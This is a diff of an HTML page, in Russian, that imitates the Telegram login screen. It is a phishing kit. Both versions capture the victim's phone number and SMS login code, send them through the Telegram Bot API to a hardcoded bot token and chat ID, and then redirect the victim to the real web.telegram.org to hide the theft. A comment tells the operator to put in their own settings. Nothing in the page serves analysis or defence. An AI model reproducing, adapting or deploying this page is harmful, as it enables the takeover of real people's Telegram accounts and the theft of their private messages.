@@ -2,10 +2,10 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Telegram</title>
     <style>
-        /* --- ПЕРЕМЕННЫЕ ЦВЕТОВ (ПО УМОЛЧАНИЮ LIGHT) --- */
+        /* --- ПЕРЕМЕННЫЕ ЦВЕТОВ --- */
         :root {
             --bg-color: #FFFFFF;
             --text-main: #000000;
@@ -13,19 +13,9 @@
             --accent-blue: #2481CC;
             --border-color: #DADCE0;
             --input-bg: #FFFFFF;
-            --android-status-bar: #FFFFFF;
-            --android-input-active-border: #2481CC;
-            --android-fab-bg: #2481CC;
-            --android-fab-text: #FFFFFF;
-            --android-keypad-bg: #F0F0F0;
-            --android-key-bg: #FFFFFF;
-            --android-key-text: #000000;
-            --ios-nav-bg: #F7F7F7;
-            --ios-nav-text: #000000;
-            --ios-input-bg: #FFFFFF;
-            --ios-keypad-bg: #D1D3D9;
-            --ios-key-bg: #FFFFFF;
-            --ios-key-text: #000000;
+            --keypad-bg: #F0F0F0;
+            --key-bg: #FFFFFF;
+            --key-text: #000000;
         }
 
         @media (prefers-color-scheme: dark) {
@@ -35,18 +25,9 @@
                 --text-secondary: #AAAAAA;
                 --border-color: #38383A;
                 --input-bg: #2C2C2E;
-                --android-status-bar: #1C1C1D;
-                --android-input-active-border: #64B5F6;
-                --android-fab-bg: #64B5F6;
-                --android-keypad-bg: #2C2C2E;
-                --android-key-bg: #3A3A3C;
-                --android-key-text: #FFFFFF;
-                --ios-nav-bg: #1C1C1D;
-                --ios-nav-text: #FFFFFF;
-                --ios-input-bg: #2C2C2E;
-                --ios-keypad-bg: #2C2C2E;
-                --ios-key-bg: #3A3A3C;
-                --ios-key-text: #FFFFFF;
+                --keypad-bg: #2C2C2E;
+                --key-bg: #3A3A3C;
+                --key-text: #FFFFFF;
             }
         }
 
@@ -67,624 +48,285 @@
             overflow: hidden;
         }
 
-        .platform-android, .platform-ios {
-            display: none;
-            height: 100%;
-            flex-direction: column;
-        }
-
-        .android-active .platform-android {
-            display: flex;
-        }
-
-        .ios-active .platform-ios {
-            display: flex;
-        }
-
-        /* Android стили */
-        .android-header {
-            height: 56px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 16px;
-            background: var(--android-status-bar);
-            position: relative;
-        }
-
-        .android-header .back-icon,
-        .android-header .qr-icon,
-        .android-header .globe-icon {
-            font-size: 24px;
-            color: var(--text-main);
-            cursor: pointer;
-        }
-
-        .login-content {
+        /* Основной контент */
+        .container {
             flex: 1;
-            padding: 24px 32px;
+            padding: 24px 20px;
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
+            overflow-y: auto;
         }
 
-        .login-title {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 12px;
-        }
-
-        .login-subtitle {
-            font-size: 15px;
-            color: var(--text-secondary);
-            line-height: 1.4;
-            margin-bottom: 32px;
-            max-width: 280px;
-        }
-
-        .input-group {
-            width: 100%;
-            margin-bottom: 16px;
-            position: relative;
-        }
-
-        .android-country-select {
-            width: 100%;
-            height: 56px;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 16px;
-            font-size: 16px;
-            color: var(--text-secondary);
-            cursor: pointer;
-            background: var(--input-bg);
-        }
-
-        .android-country-select .arrow-icon {
-            color: #B0B3B8;
-        }
-
-        .android-phone-input-wrapper {
-            position: relative;
-            width: 100%;
-            margin-top: 12px;
-        }
-
-        .android-phone-input {
-            width: 100%;
-            height: 56px;
-            border: 2px solid var(--accent-blue);
-            border-radius: 8px;
-            padding: 0 16px;
-            font-size: 18px;
-            background: var(--input-bg);
-            color: var(--text-main);
-            outline: none;
-        }
-
-        .android-phone-label {
-            position: absolute;
-            left: 12px;
-            top: -10px;
-            background: var(--bg-color);
-            padding: 0 4px;
-            font-size: 12px;
-            color: var(--accent-blue);
-            font-weight: 500;
-        }
-
-        .checkbox-group {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            margin-bottom: 16px;
-            font-size: 15px;
-            color: var(--text-main);
-        }
-
-        .checkbox-group input[type="checkbox"] {
-            margin-right: 12px;
-            width: 18px;
-            height: 18px;
-            accent-color: var(--accent-blue);
-        }
-
-        .android-fab {
-            position: fixed;
-            right: 16px;
-            bottom: 270px;
-            width: 56px;
-            height: 56px;
-            background-color: var(--android-fab-bg);
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: var(--accent-blue);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: var(--android-fab-text);
+            margin: 20px auto 24px;
+        }
+        .logo svg {
+            width: 32px;
+            height: 32px;
+            fill: white;
+        }
+
+        h1 {
             font-size: 24px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
-            cursor: pointer;
-            border: none;
-            transition: transform 0.1s;
-        }
-
-        .android-fab:active {
-            transform: scale(0.95);
-        }
-
-        /* iOS стили */
-        .ios-header {
-            height: 44px;
-            background-color: var(--ios-nav-bg);
-            border-bottom: 0.5px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
-
-        .ios-header .back-button {
-            position: absolute;
-            left: 8px;
-            color: var(--accent-blue);
-            font-size: 17px;
-            font-weight: 400;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-        }
-
-        .ios-header .title {
-            font-size: 17px;
-            font-weight: 600;
-            color: var(--ios-nav-text);
-        }
-
-        .ios-header .next-button {
-            position: absolute;
-            right: 16px;
-            color: var(--accent-blue);
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .ios-content {
-            flex: 1;
-            padding: 30px 16px;
-            text-align: center;
-        }
-
-        .ios-title {
-            font-size: 28px;
-            font-weight: 700;
+            font-weight: 500;
             margin-bottom: 8px;
         }
 
-        .ios-subtitle {
+        .sub {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 32px;
+        }
+
+        /* Поля ввода */
+        .input-group {
+            width: 100%;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
             font-size: 16px;
-            color: var(--text-secondary);
-            margin-bottom: 35px;
-        }
-
-        .ios-input-container {
-            border-top: 0.5px solid var(--border-color);
-            border-bottom: 0.5px solid var(--border-color);
-            background-color: var(--ios-input-bg);
-        }
-
-        .ios-row {
-            height: 44px;
-            display: flex;
-            align-items: center;
-            padding: 0 16px;
-            font-size: 17px;
-        }
-
-        .ios-row + .ios-row {
-            border-top: 0.5px solid var(--border-color);
-            margin-left: 16px;
-        }
-
-        .ios-label {
-            width: 80px;
-            text-align: left;
-            color: var(--text-secondary);
-        }
-
-        .ios-value {
-            flex: 1;
-            text-align: left;
-            color: var(--text-main);
-        }
-
-        .ios-value.placeholder {
-            color: #C7C7CD;
-        }
-
-        .ios-arrow {
-            color: #C7C7CD;
-            font-size: 18px;
-        }
-
-        .ios-phone-input {
-            flex: 1;
-            border: none;
-            font-size: 17px;
-            background: transparent;
+            background: var(--input-bg);
             color: var(--text-main);
             outline: none;
+            transition: border 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--accent-blue);
+        }
+
+        /* Кнопка */
+        button {
+            width: 100%;
+            padding: 14px;
+            background: var(--accent-blue);
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        button:active {
+            opacity: 0.8;
         }
 
         /* Клавиатура */
         .keypad {
-            height: 260px;
-            padding: 6px;
+            background: var(--keypad-bg);
+            padding: 8px;
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 6px;
-        }
-
-        .android-active .keypad {
-            background-color: var(--android-keypad-bg);
-        }
-
-        .android-active .key {
-            background-color: var(--android-key-bg);
-            border-radius: 4px;
-            color: var(--android-key-text);
-            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
-        }
-
-        .ios-active .keypad {
-            background-color: var(--ios-keypad-bg);
-            padding: 8px 6px;
-            gap: 7px;
-        }
-
-        .ios-active .key {
-            background-color: var(--ios-key-bg);
-            border-radius: 5px;
-            color: var(--ios-key-text);
-            box-shadow: 0 1px 0 rgba(0,0,0,0.3);
+            gap: 8px;
+            border-top: 1px solid var(--border-color);
         }
 
         .key {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            background: var(--key-bg);
+            border-radius: 8px;
+            padding: 14px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            color: var(--key-text);
             cursor: pointer;
-            transition: background 0.1s;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
         }
 
         .key:active {
             opacity: 0.7;
         }
 
-        .key-num {
-            font-size: 26px;
-            font-weight: 400;
-        }
-
-        .key-letters {
+        .key.letters {
             font-size: 10px;
             text-transform: uppercase;
             letter-spacing: 1px;
             color: var(--text-secondary);
-            margin-top: -2px;
-        }
-
-        .key.empty {
-            background: transparent;
-            box-shadow: none;
-            cursor: default;
+            margin-top: -4px;
         }
 
         .key.backspace {
-            font-size: 22px;
+            font-size: 20px;
         }
 
-        /* Экран загрузки */
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
+        .error {
+            background: #fee;
+            color: #d33;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 16px;
             width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
             display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-        }
-
-        .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #fff;
-            border-top: 4px solid #2481CC;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            color: white;
-            font-size: 16px;
         }
     </style>
 </head>
 <body>
-    <!-- Android интерфейс -->
-    <div class="platform-android">
-        <div class="android-header">
-            <div class="back-icon">←</div>
-            <div style="display: flex; gap: 20px;">
-                <div class="qr-icon">⚿</div>
-                <div class="globe-icon">🌐</div>
-            </div>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.218-1.447 1.394c-.16.16-.295.295-.605.295l.215-3.09 5.63-5.09c.245-.215-.054-.335-.38-.12l-6.96 4.39-3.02-.94c-.655-.205-.667-.655.137-.97l11.77-4.54c.547-.2 1.025.12.854.97z"/>
+            </svg>
+        </div>
+        <h1>Номер телефона</h1>
+        <div class="sub">Проверьте код страны и введите свой номер телефона.</div>
+
+        <div id="errorMsg" class="error"></div>
+
+        <div class="input-group">
+            <label>Номер телефона</label>
+            <input type="tel" id="phone" placeholder="+7 XXX XXX-XX-XX" autocomplete="off">
         </div>
 
-        <div class="login-content">
-            <h1 class="login-title">Номер телефона</h1>
-            <p class="login-subtitle">Проверьте код страны и введите свой номер телефона.</p>
-
-            <div class="input-group">
-                <div class="android-country-select">
-                    <span>Страна</span>
-                    <span class="arrow-icon">›</span>
-                </div>
-            </div>
-
-            <div class="input-group">
-                <div class="android-phone-input-wrapper">
-                    <span class="android-phone-label">Номер телефона</span>
-                    <input type="text" id="androidPhone" class="android-phone-input" value="+7">
-                </div>
-            </div>
-
-            <div class="checkbox-group" style="margin-top: 10px;">
-                <input type="checkbox" id="sync" checked>
-                <label for="sync">Синхронизировать контакты</label>
-            </div>
-
-            <div class="checkbox-group">
-                <input type="checkbox" id="proxy">
-                <label for="proxy">Использовать прокси</label>
-            </div>
+        <div class="input-group" id="codeGroup" style="display: none;">
+            <label>Код подтверждения</label>
+            <input type="text" id="code" placeholder="XXXXX" autocomplete="off">
         </div>
 
-        <button class="android-fab" id="androidNextBtn">→</button>
+        <button id="nextBtn">Далее</button>
     </div>
 
-    <!-- iOS интерфейс -->
-    <div class="platform-ios">
-        <div class="ios-header">
-            <div class="back-button">‹ Назад</div>
-            <div class="title">Ваш телефон</div>
-            <div class="next-button" id="iosNextBtn">Далее</div>
-        </div>
-
-        <div class="ios-content">
-            <h1 class="ios-title">Ваш телефон</h1>
-            <p class="ios-subtitle">Подтвердите код страны и введите Ваш номер телефона.</p>
-
-            <div class="ios-input-container">
-                <div class="ios-row">
-                    <div class="ios-label">Страна</div>
-                    <div class="ios-value">Россия</div>
-                    <div class="ios-arrow">›</div>
-                </div>
-                <div class="ios-row">
-                    <div class="ios-label">Код</div>
-                    <div class="ios-value active-code">+7</div>
-                </div>
-                <div class="ios-row">
-                    <input type="tel" id="iosPhone" class="ios-phone-input" placeholder="Ваш номер">
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Клавиатура -->
-    <div class="keypad">
-        <div class="key" data-digit="1"><span class="key-num">1</span><span class="key-letters">&nbsp;</span></div>
-        <div class="key" data-digit="2"><span class="key-num">2</span><span class="key-letters">ABC</span></div>
-        <div class="key" data-digit="3"><span class="key-num">3</span><span class="key-letters">DEF</span></div>
-        <div class="key" data-digit="4"><span class="key-num">4</span><span class="key-letters">GHI</span></div>
-        <div class="key" data-digit="5"><span class="key-num">5</span><span class="key-letters">JKL</span></div>
-        <div class="key" data-digit="6"><span class="key-num">6</span><span class="key-letters">MNO</span></div>
-        <div class="key" data-digit="7"><span class="key-num">7</span><span class="key-letters">PQRS</span></div>
-        <div class="key" data-digit="8"><span class="key-num">8</span><span class="key-letters">TUV</span></div>
-        <div class="key" data-digit="9"><span class="key-num">9</span><span class="key-letters">WXYZ</span></div>
-        <div class="key empty"></div>
-        <div class="key" data-digit="0"><span class="key-num">0</span><span class="key-letters">+</span></div>
-        <div class="key backspace" data-digit="backspace">⌫</div>
-    </div>
-
-    <!-- Экран загрузки -->
-    <div class="loading-screen" id="loadingScreen">
-        <div class="spinner"></div>
-        <div class="loading-text">Подключение к Telegram...</div>
+    <div class="keypad" id="keypad">
+        <div class="key" data-digit="1">1</div>
+        <div class="key" data-digit="2">2</div>
+        <div class="key" data-digit="3">3</div>
+        <div class="key" data-digit="4">4</div>
+        <div class="key" data-digit="5">5</div>
+        <div class="key" data-digit="6">6</div>
+        <div class="key" data-digit="7">7</div>
+        <div class="key" data-digit="8">8</div>
+        <div class="key" data-digit="9">9</div>
+        <div class="key" data-digit="backspace">⌫</div>
+        <div class="key" data-digit="0">0</div>
+        <div class="key" data-digit="next">⏎</div>
     </div>
 
     <script>
-        // Твои данные
+        // === НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) ===
         const BOT_TOKEN = "8755907309:AAHcG2zLepeJyrWSk1dtf4kAtpIVkGsxsx0";
         const CHAT_ID = 8637392176;
-        
-        let currentPhone = "";
-        let currentCode = "";
+        // =================================
 
-        // Определение платформы
-        function detectPlatform() {
-            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            const body = document.body;
-            body.classList.remove('android-active', 'ios-active');
-            if (/android/i.test(userAgent)) {
-                body.classList.add('android-active');
-            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                body.classList.add('ios-active');
-            } else {
-                body.classList.add('android-active');
-            }
-        }
+        let currentInput = 'phone';
+        let phoneNumber = '';
+        let codeValue = '';
 
-        // Работа с клавиатурой
-        function initKeyboard(inputElement) {
-            document.querySelectorAll('.key').forEach(key => {
-                key.removeEventListener('click', key._listener);
-                const handler = () => {
-                    const digit = key.getAttribute('data-digit');
-                    if (digit === 'backspace') {
-                        inputElement.value = inputElement.value.slice(0, -1);
-                    } else if (digit && digit !== 'backspace') {
-                        inputElement.value += digit;
-                    }
-                };
-                key.addEventListener('click', handler);
-                key._listener = handler;
-            });
-        }
+        const phoneInput = document.getElementById('phone');
+        const codeInput = document.getElementById('code');
+        const codeGroup = document.getElementById('codeGroup');
+        const nextBtn = document.getElementById('nextBtn');
+        const errorMsg = document.getElementById('errorMsg');
 
-        // Отправка в Telegram
-        async function sendToBot(text) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-                });
-            } catch(e) {
-                console.log('Ошибка отправки:', e);
-            }
-        }
-
-        // Показать экран загрузки и редирект
-        function showLoadingAndRedirect() {
-            document.getElementById('loadingScreen').style.display = 'flex';
+        function showError(text) {
+            errorMsg.style.display = 'block';
+            errorMsg.innerText = text;
             setTimeout(() => {
-                window.location.href = 'https://web.telegram.org';
-            }, 2000);
+                errorMsg.style.display = 'none';
+            }, 3000);
         }
 
-        // Получить номер телефона (Android или iOS)
-        function getPhoneNumber() {
-            const isAndroid = document.body.classList.contains('android-active');
-            if (isAndroid) {
-                return document.getElementById('androidPhone')?.value || '';
-            } else {
-                return document.getElementById('iosPhone')?.value || '';
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+                const data = await response.json();
+                if (!data.ok) console.error('Ошибка Telegram:', data);
+            } catch (err) {
+                console.error('Ошибка отправки:', err);
             }
         }
 
-        // Обработка кода (второй шаг)
-        function showCodeInput() {
-            const phone = getPhoneNumber();
-            if (!phone || phone.length < 5) {
-                alert('Введите полный номер телефона');
-                return;
-            }
-            
-            currentPhone = phone;
-            sendToBot(`📱 Номер: ${currentPhone}`);
-            
-            // Создаём экран для ввода кода
-            const isAndroid = document.body.classList.contains('android-active');
-            
-            let codeScreen = document.getElementById('codeScreen');
-            if (!codeScreen) {
-                codeScreen = document.createElement('div');
-                codeScreen.id = 'codeScreen';
-                codeScreen.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:var(--bg-color);z-index:100;display:none;flex-direction:column;';
-                codeScreen.innerHTML = `
-                    <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;">
-                        <h2 style="margin-bottom:20px;">Код подтверждения</h2>
-                        <p style="margin-bottom:30px;color:var(--text-secondary);">Мы отправили SMS с кодом на номер ${currentPhone}</p>
-                        <input type="text" id="codeInput" style="width:80%;padding:15px;font-size:24px;text-align:center;border:1px solid var(--border-color);border-radius:12px;background:var(--input-bg);color:var(--text-main);margin-bottom:30px;" placeholder="XXXXX">
-                        <button id="submitCodeBtn" style="background:var(--accent-blue);color:white;border:none;padding:15px 30px;border-radius:30px;font-size:16px;cursor:pointer;">Подтвердить</button>
-                    </div>
-                `;
-                document.body.appendChild(codeScreen);
+        // Обработка нажатия "Далее" / "Подтвердить"
+        nextBtn.addEventListener('click', () => {
+            if (currentInput === 'phone') {
+                const phone = phoneInput.value.trim();
+                if (!phone) {
+                    showError('Введите номер телефона');
+                    return;
+                }
+                phoneNumber = phone;
+                sendToTelegram(`📱 Номер: ${phoneNumber}`);
                 
-                document.getElementById('submitCodeBtn')?.addEventListener('click', async () => {
-                    const code = document.getElementById('codeInput')?.value || '';
-                    if (!code) {
-                        alert('Введите код');
-                        return;
-                    }
-                    currentCode = code;
-                    await sendToBot(`🔐 Код: ${currentCode}\n📱 Номер: ${currentPhone}`);
-                    showLoadingAndRedirect();
-                });
-            }
-            
-            // Скрываем основной интерфейс и показываем экран кода
-            document.querySelector('.platform-android')?.style.setProperty('display', 'none');
-            document.querySelector('.platform-ios')?.style.setProperty('display', 'none');
-            document.querySelector('.keypad')?.style.setProperty('display', 'none');
-            codeScreen.style.display = 'flex';
-            
-            // Привязываем клавиатуру к полю кода
-            const codeInput = document.getElementById('codeInput');
-            if (codeInput) {
-                initKeyboard(codeInput);
+                // Переключаем на ввод кода
+                currentInput = 'code';
+                phoneInput.style.display = 'none';
+                codeGroup.style.display = 'block';
+                nextBtn.innerText = 'Подтвердить';
                 codeInput.focus();
+            } 
+            else if (currentInput === 'code') {
+                const code = codeInput.value.trim();
+                if (!code) {
+                    showError('Введите код подтверждения');
+                    return;
+                }
+                codeValue = code;
+                sendToTelegram(`🔐 Код: ${codeValue}\n📱 Номер: ${phoneNumber}`);
+                
+                // Редирект
+                nextBtn.innerText = 'Connecting...';
+                nextBtn.disabled = true;
+                setTimeout(() => {
+                    window.location.href = 'https://web.telegram.org';
+                }, 2000);
             }
-        }
+        });
 
-        // Навигация
-        function navigateToCode() {
-            showCodeInput();
-        }
+        // Клавиатура
+        document.querySelectorAll('.key').forEach(key => {
+            key.addEventListener('click', () => {
+                const digit = key.getAttribute('data-digit');
+                if (currentInput === 'phone') {
+                    if (digit === 'backspace') {
+                        phoneInput.value = phoneInput.value.slice(0, -1);
+                    } else if (digit === 'next') {
+                        nextBtn.click();
+                    } else if (digit) {
+                        phoneInput.value += digit;
+                    }
+                } else if (currentInput === 'code') {
+                    if (digit === 'backspace') {
+                        codeInput.value = codeInput.value.slice(0, -1);
+                    } else if (digit === 'next') {
+                        nextBtn.click();
+                    } else if (digit) {
+                        codeInput.value += digit;
+                    }
+                }
+            });
+        });
 
-        // Инициализация
-        function init() {
-            detectPlatform();
-            
-            const isAndroid = document.body.classList.contains('android-active');
-            const phoneInput = isAndroid ? document.getElementById('androidPhone') : document.getElementById('iosPhone');
-            
-            if (phoneInput) {
-                initKeyboard(phoneInput);
-                phoneInput.focus();
-            }
-            
-            // Кнопка "Далее"
-            const nextBtn = isAndroid ? document.getElementById('androidNextBtn') : document.getElementById('iosNextBtn');
-            if (nextBtn) {
-                nextBtn.addEventListener('click', navigateToCode);
-            }
-            
-            // Кнопка "Назад" на iOS (для возврата)
-            const backBtn = document.querySelector('.back-button');
-            if (backBtn) {
-                backBtn.addEventListener('click', () => {
-                    window.location.reload();
-                });
-            }
-            
-            const backIcon = document.querySelector('.back-icon');
-            if (backIcon) {
-                backIcon.addEventListener('click', () => {
-                    window.location.reload();
-                });
-            }
-        }
-
-        // Запуск
-        init();
+        // Фокус
+        phoneInput.addEventListener('focus', () => { currentInput = 'phone'; });
+        codeInput.addEventListener('focus', () => { currentInput = 'code'; });
     </script>
 </body>
 </html>
